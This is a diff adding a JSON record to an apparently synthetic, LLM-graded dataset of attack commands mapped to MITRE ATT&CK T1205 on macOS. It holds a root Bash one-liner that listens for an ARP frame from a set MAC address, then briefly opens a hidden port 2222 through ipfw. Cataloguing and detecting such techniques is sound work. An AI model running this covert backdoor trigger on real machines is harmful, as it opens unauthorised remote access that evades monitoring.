@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo bash -c 'tcpdump -ln -i en0 -c 1 \"arp and ether src de:ad:be:ef:00:01\" >/dev/null && ipfw add 610 allow tcp from any to me 2222 in; sleep 60; ipfw delete 610'",
+  "explanation": "Uses a crafted ARP frame from a specific MAC as a local-layer magic signal; when seen, ipfw temporarily allows TCP/2222 for 60 seconds. Requires elevated privileges.",
+  "rationale_steps": [
+    "Abuse L2 ARP traffic as a covert trigger (non-routable, low visibility across segments).",
+    "Open a hidden management port briefly upon receipt.",
+    "Detection: alert on ARP from unexpected MAC OUIs; correlate with ipfw rule changes and short-lived port 2222 openings."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-fe1a2ad7-ea7bac70",
+  "source_prompt_hash": "fe1a2ad7",
+  "timestamp_utc": "2025-09-30T06:07:36.671120Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, correct command separators, and valid tcpdump and ipfw flag usage.",
+        "semantic_score": 4,
+        "semantic_justification": "It implements an ARP-based signal to temporarily open TCP/2222 via ipfw, aligning with T1205, but depends on legacy ipfw availability on modern macOS and the cleanup runs regardless of whether the trigger fired.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T18:29:29.589990Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid command separators, correct flag formats for all utilities, and appropriate nesting within the `bash -c` string.",
+        "semantic_score": 5,
+        "semantic_justification": "The command directly implements Traffic Signaling by using `tcpdump` to monitor for a specific ARP packet (a protocol field/header value as a signal) and, upon detection, triggers a temporary firewall rule modification, perfectly aligning with the technique's description of coordinating actions or triggering payloads.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T18:29:43.208433Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
